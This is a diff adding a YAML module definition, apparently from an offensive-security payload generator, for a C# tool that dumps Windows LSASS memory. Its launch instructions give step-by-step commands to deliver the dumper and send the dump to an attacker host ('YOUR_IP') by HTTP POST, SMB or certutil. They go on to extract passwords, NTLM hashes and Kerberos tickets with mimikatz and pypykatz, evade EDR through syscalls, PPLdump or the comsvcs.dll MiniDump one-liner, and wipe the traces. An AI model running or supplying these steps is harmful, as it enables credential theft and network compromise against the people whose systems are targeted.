@@ -1,0 +1,150 @@
+meta:
+  name: "C# LSASS MiniDump Credential Dumper"
+  category: "Credential Access"
+  description: |
+    Dumps LSASS process memory to extract credentials using MiniDumpWriteDump.
+    
+    Features:
+    - Direct LSASS memory dumping
+    - Uses DbgHelp.dll MiniDumpWriteDump API
+    - Configurable output path
+    - Full memory dump for maximum credential extraction
+    - Minimal obfuscation (straightforward implementation)
+    
+    The dumped file can be analyzed offline with tools like Mimikatz or pypykatz
+    to extract plaintext passwords, NTLM hashes, Kerberos tickets, and other credentials.
+    
+    WARNING: For authorized security testing only! This technique is heavily monitored by EDR.
+
+  effectiveness: "low"
+
+  mitre:
+    tactic: "TA0006 - Credential Access"
+    technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
+
+  artifacts:
+    - "OpenProcess on lsass.exe (PID lookup)"
+    - "MiniDumpWriteDump API calls"
+    - "Large dump file creation (50-200 MB typical)"
+    - "PROCESS_ALL_ACCESS on LSASS"
+    - "File creation in specified path"
+    - "Sysmon Event ID 10 (ProcessAccess)"
+
+parameters:
+  - name: "dump_path"
+    type: "string"
+    description: "Full path where LSASS dump file will be saved"
+    required: true
+    default: "C:\\Windows\\Tasks\\lsass.dmp"
+
+  - name: "output_file"
+    type: "string"
+    description: "Output executable filename"
+    required: false
+    default: "dumper.exe"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: false
+    default: "{config.output_dir}"
+
+preprocessing: []
+
+output:
+  type: "template"
+  template: "credential_access/minidump.cs"
+  compile:
+    enabled: true
+    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 {{ source_file }}"
+  launch_instructions: |
+    C# LSASS MiniDump Credential Dumper - Launch Instructions
+
+    Prerequisites:
+
+    - Administrator privileges or SeDebugPrivilege required
+    - Target must be Windows (LSASS is Windows-only)
+    - DbgHelp.dll must be present (included in Windows by default)
+
+    Step 1: Transfer Payload to Target
+
+    Transfer the generated executable to the target Windows system:
+
+    Using Python HTTP server:
+    python3 -m http.server 8080
+
+    On target (PowerShell as Admin):
+    Invoke-WebRequest -Uri "http://YOUR_IP:8080/{{ output_file }}" -OutFile "{{ output_file }}"
+
+    Step 2: Execute Dumper
+
+    Run with default output path:
+    {{ output_file }}
+
+    Or specify custom output path:
+    {{ output_file }} C:\\Temp\\lsass_backup.dmp
+
+    Step 3: Transfer Dump File to Attacker Machine
+
+    From target (PowerShell):
+    Invoke-WebRequest -Uri "http://YOUR_IP:8080/upload" -Method POST -InFile "{{ dump_path }}"
+
+    Or using SMB:
+    On attacker: impacket-smbserver share . -smb2support
+    On target: copy {{ dump_path }} \\YOUR_IP\share\lsass.dmp
+
+    Or exfiltrate via base64:
+    certutil -encode {{ dump_path }} lsass_b64.txt
+    [Copy contents and decode on attacker machine]
+
+    Step 4: Extract Credentials with Mimikatz
+
+    On attacker machine (Windows):
+    mimikatz.exe
+    sekurlsa::minidump lsass.dmp
+    sekurlsa::logonPasswords full
+
+    Or with pypykatz (Linux):
+    pypykatz lsa minidump lsass.dmp
+
+    Notes:
+
+    - Default dump path: {{ dump_path }}
+    - Dump file is typically 50-200 MB in size
+    - Requires admin rights or SeDebugPrivilege
+    - HEAVILY monitored by EDR/AV (high detection rate)
+    - Consider obfuscation, process cloning, or indirect syscalls for evasion
+    - Sysmon will log ProcessAccess events to LSASS
+    - Windows Defender often blocks direct LSASS access
+
+    Extracted Credentials Include:
+
+    - Plaintext passwords (if WDigest enabled)
+    - NTLM hashes
+    - Kerberos tickets (TGT/TGS)
+    - Domain cached credentials
+    - LM hashes (older systems)
+
+    Evasion Tips:
+
+    - Use process cloning techniques instead of direct dump
+    - Implement syscalls to bypass userland hooks
+    - Dump from Volume Shadow Copy instead
+    - Use PPLdump for Protected Process Light bypass
+    - Consider comsvcs.dll method: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] C:\\temp\\lsass.dmp full
+
+    Troubleshooting:
+
+    - Access Denied: Run as Administrator
+    - File creation fails: Check disk space and path permissions
+    - No credentials extracted: LSASS may be protected (PPL)
+    - EDR blocks: This is expected; technique is well-known
+
+    Cleanup:
+
+    After extraction, securely delete dump file:
+    sdelete64 -p 7 {{ dump_path }}
+
+    Or simply:
+    Remove-Item {{ dump_path }} -Force
+    Remove-Item {{ output_file }} -Force
